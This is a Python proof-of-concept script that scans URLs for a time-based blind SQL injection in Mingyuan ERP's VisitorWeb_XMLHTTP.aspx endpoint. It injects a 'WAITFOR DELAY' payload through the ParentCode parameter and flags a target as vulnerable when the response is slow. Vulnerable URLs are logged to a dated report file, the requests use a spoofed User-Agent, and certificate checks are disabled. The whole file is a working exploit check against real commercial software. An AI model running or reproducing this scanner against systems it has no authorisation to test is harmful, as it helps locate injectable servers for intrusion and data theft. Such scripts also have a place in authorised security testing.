import requests
import time
import buter
import wirtefile

filename = "./reps/明源ERP-sql时间盲注-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
poc = "/cgztbweb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ParentCode=1';WAITFOR%20DELAY%20'0:0:7'--&ywtype=GetParentProjectName"

def mingyuanSQL(url):
    try:
        start_time = time.time()
        response = requests.get(url=url + poc, headers=headers, verify=False, timeout=15)
        end_time = time.time()
        elapsed_time = end_time - start_time
        if elapsed_time >= 7:
                print(buter.colors.GREEN+  f"存在明源ERP_sql时间盲注 url : {url}" + buter.colors.END)
                wirtefile.writefiles(filename,url)
        else:
            print(buter.colors.RED+ f"未发现明源ERP_sql时间盲注 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
